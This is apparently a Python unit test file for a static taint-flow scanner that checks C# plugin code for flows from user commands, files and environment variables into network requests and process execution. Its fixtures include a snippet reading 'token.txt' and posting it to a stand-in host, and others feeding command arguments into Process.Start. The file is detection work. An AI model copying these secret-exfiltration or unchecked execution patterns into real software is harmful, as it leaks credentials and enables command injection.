from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
import sys

ROOT = Path(__file__).resolve().parents[2]
CATALOG = ROOT / "tools" / "catalog"
if str(CATALOG) not in sys.path:
    sys.path.insert(0, str(CATALOG))

import semantic_flow


class SemanticFlowTests(unittest.TestCase):
    def _collect(self, files: dict[str, str], behavior: dict | None = None) -> dict:
        encoded = {name: value.encode() for name, value in files.items()}
        entries = {name: len(value) for name, value in encoded.items()}
        return semantic_flow.collect(entries, lambda path: encoded[path], source_behavior=behavior or {})

    def test_registry_validates_and_has_revision(self) -> None:
        registry = semantic_flow.load_registry()
        self.assertTrue(str(registry["revision"]).startswith("semantic-flow-registry-v1-"))
        self.assertTrue(any(item["id"] == "process.execute" for item in registry["sinks"]))
        self.assertTrue(any(item["id"] == "input.command.arguments" for item in registry["sources"]))

    def test_direct_file_data_to_network_body(self) -> None:
        result = self._collect({"Plugin.cs": """
public class Plugin {
  public async Task Send() {
    var secret = File.ReadAllText("token.txt");
    await httpClient.PostAsync("https://example.invalid", new StringContent(secret));
  }
}
"""})
        flows = result["flows"]
        self.assertTrue(any(item["sourceKind"] == "filesystem.read" and item["sinkKind"] == "network.request.body" for item in flows))

    def test_command_arguments_flow_through_helper_to_process(self) -> None:
        source = """
public class Plugin {
  public Plugin() { commandManager.AddHandler("/omega", OnCommand); }
  private void OnCommand(string command, string args) { Execute(args); }
  private void Execute(string value) { Process.Start(value); }
}
"""
        behavior = {
            "triggers": [{
                "triggerId": "trigger-command", "path": "Plugin.cs", "line": 3,
                "kind": "user-command", "event": "/omega", "handler": "OnCommand",
            }]
        }
        result = self._collect({"Plugin.cs": source}, behavior)
        flow = next(item for item in result["flows"] if item["sourceKind"] == "input.command.arguments" and item["sinkKind"] == "process.execute")
        self.assertTrue(flow["interprocedural"])
        self.assertGreaterEqual(flow["interproceduralDepth"], 1)

    def test_return_summary_propagates_direct_source(self) -> None:
        result = self._collect({"Plugin.cs": """
public class Plugin {
  private string ReadName() { return Environment.GetEnvironmentVariable("OMEGA_TOOL"); }
  public void Run() { var tool = ReadName(); Process.Start(tool); }
}
"""})
        self.assertTrue(any(item["sourceKind"] == "environment.variable" and item["sinkKind"] == "process.execute" for item in result["flows"]))

    def test_sanitizer_is_recorded_but_not_treated_as_verdict(self) -> None:
        source = """
public class Plugin {
  public Plugin() { commandManager.AddHandler("/omega", OnCommand); }
  private void OnCommand(string command, string args) {
    var name = Path.GetFileName(args);
    File.WriteAllText(name, "x");
  }
}
"""
        behavior = {"triggers": [{"triggerId": "t", "path": "Plugin.cs", "line": 3, "kind": "user-command", "event": "/omega", "handler": "OnCommand"}]}
        result = self._collect({"Plugin.cs": source}, behavior)
        flow = next(item for item in result["flows"] if item["sinkKind"] == "filesystem.path.write")
        self.assertTrue(flow["sanitized"])
        self.assertIn("path.basename", flow["sanitizers"])
        self.assertEqual("static-flow-observation-only", flow["authority"])


    def test_constructor_body_is_analyzed(self) -> None:
        result = self._collect({"Plugin.cs": """
public class Plugin {
  public Plugin() { var tool = Environment.GetEnvironmentVariable("OMEGA_TOOL"); Process.Start(tool); }
}
"""})
        self.assertTrue(any(item["sourceKind"] == "environment.variable" and item["sinkKind"] == "process.execute" for item in result["flows"]))

    def test_static_process_start_has_no_taint_flow(self) -> None:
        result = self._collect({"Plugin.cs": """
public class Plugin {
  public void Run() { Process.Start("notepad.exe"); }
}
"""})
        self.assertEqual([], result["flows"])
        self.assertGreaterEqual(result["summary"]["sinkCount"], 1)


if __name__ == "__main__":
    unittest.main()
